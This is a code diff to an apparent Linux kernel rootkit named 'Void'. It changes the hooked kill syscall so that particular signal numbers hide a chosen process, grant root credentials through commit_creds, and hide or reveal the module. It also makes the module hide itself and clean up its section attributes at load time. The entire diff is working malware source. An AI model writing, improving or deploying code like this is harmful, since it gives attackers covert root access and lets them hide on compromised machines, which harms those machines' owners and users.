@@ -7,6 +7,7 @@
 #include <linux/kallsyms.h>
 #include <asm/uaccess.h>
 #include <linux/uaccess.h>
+#include<linux/sched.h>
 #include <linux/dirent.h>
 #include <linux/tcp.h>
 #include <linux/ftrace.h>
@@ -15,6 +16,13 @@
 
 //#define PREFIX "voidbyte"
 #define HIDDEN_USER "root"
+//#define PF_INVISIBLE 0x10000000
+
+enum {
+    SIGINVIS = 31,
+    SIGSUPER = 64,
+    SIGMODINVIS = 63,
+};
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("0xVoidbyte");
@@ -45,27 +53,31 @@ static asmlinkage long (*orig_pread64)(const struct pt_regs *);
 asmlinkage int hook_kill(const struct pt_regs *regs){
     void set_root(void);
     void showme(void);
-    void hideme(void);
-    pid_t pid = regs->di;
-    int sig=regs->si;
-    if((sig=64)&&(hidden==0)){
-        printk(KERN_INFO "[Void]RK: hiding rootkit!\n");
-        hideme();
-        printk(KERN_INFO "[Void]RK: giving root...\n");
-        set_root();
-        printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
-        sprintf(hide_pid, "%d", pid);
-        return 0;
-    } else if((sig==64)&&(hidden==1)){
-        printk(KERN_INFO "[Void]RK: revealing rootkit!\n");
-        showme();
-        printk(KERN_INFO "[Void]RK: giving root...\n");
-        set_root();
-        printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
-        sprintf(hide_pid, "%d", pid);
-        return 0;
-    } else {
-        return orig_kill(regs);
+    struct task_struct *task;
+    struct task_struct * find_task(pid_t pid);
+    pid_t pid = (pid_t)regs->di;
+    int sig=(int)regs->si;
+    switch(sig){
+        case SIGINVIS:
+            /*
+            if((task=find_task(pid))==NULL){
+                return -ESRCH;
+            }
+            task->flags ^= PF_INVISIBLE;
+            */
+            printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
+            sprintf(hide_pid, "%d", pid);
+            break;
+        case SIGSUPER:
+            printk(KERN_INFO "[Void]RK: giving root...\n");
+            set_root();
+            break;
+        case SIGMODINVIS:
+            if(hidden) showme();
+            else hideme();
+            break;
+        default:
+            return orig_kill(regs);
     }
 }
 
@@ -233,31 +245,30 @@ static asmlinkage long (*orig_pread64)(int fd, const __user *buf, size_t count, 
 static asmlinkage int hook_kill(pid_t pid, int sig){
     void set_root(void);
     void showme(void);
-    void hideme(void);
-    int sig=reg->si;
-    /*if(sig==64){
-        printk(KERN_INFO "[Void]RK: giving root...\n");
-        set_root();
-        return 0;
-    } */
-    if((sig=64)&&(hidden==0)){
-        printk(KERN_INFO "[Void]RK: hiding rootkit!\n");
-        hideme();
-        printk(KERN_INFO "[Void]RK: giving root...\n");
-        set_root();
-        printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
-        sprintf(hide_pid, "%d", pid);
-        return 0;
-    } else if((sig==64)&&(hidden==1)){
-        printk(KERN_INFO "[Void]RK: revealing rootkit!\n");
-        showme();
-        printk(KERN_INFO "[Void]RK: giving root...\n");
-        set_root();
-        printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
-        sprintf(hide_pid, "%d", pid);
-        return 0;
-    } else {
-        return orig_kill(regs);
+    struct task_struct *task;
+    struct task_struct * find_task(pid_t pid);
+    int sig=(int)regs->si;
+    switch(sig){
+        case SIGINVIS:
+            /*
+            if((task=find_task(pid))==NULL){
+                return -ESRCH;
+            }
+            task->flags ^= PF_INVISIBLE;
+            */
+            printk(KERN_INFO "[Void]RK: hiding process with pid %d\n", pid);
+            sprintf(hide_pid, "%d", pid);
+            break;
+        case SIGSUPER:
+            printk(KERN_INFO "[Void]RK: giving root...\n");
+            set_root();
+            break;
+        case SIGMODINVIS:
+            if(hidden) showme();
+            else hideme();
+            break;
+        default:
+            return orig_kill(pid,sig);
     }
 }
 
@@ -494,6 +505,40 @@ void set_root(void){
     commit_creds(root);
 }
 
+/*
+struct task_struct * find_task(pid_t pid){
+    struct task_struct *p = current;
+    for_each_process(p){
+        if(p->pid==pid){
+            return p;
+        }
+    }
+    return NULL;
+}
+
+int is_invis(pid_t pid){
+    struct task_struct * task;
+    if(!pid){
+        return 0;
+    }
+    task=find_task(pid);
+    if(!task){
+        return 0;
+    }
+    if(task->flags & PF_INVISIBLE){
+        return 1;
+    }
+    return 0;
+}
+*/
+
+static inline void tidy(void)
+{
+    kfree(THIS_MODULE->sect_attrs);
+    THIS_MODULE->sect_attrs = NULL;
+}
+
+
 void showme(void){
     list_add(&THIS_MODULE->list, prev_module);
     hidden=0;
@@ -522,6 +567,8 @@ static int __init voidrk_init(void){
     if(err){
         return err;
     }
+    hideme();
+    tidy();
     printk(KERN_INFO "[Void]RK: loaded\n");
     return 0;
 }
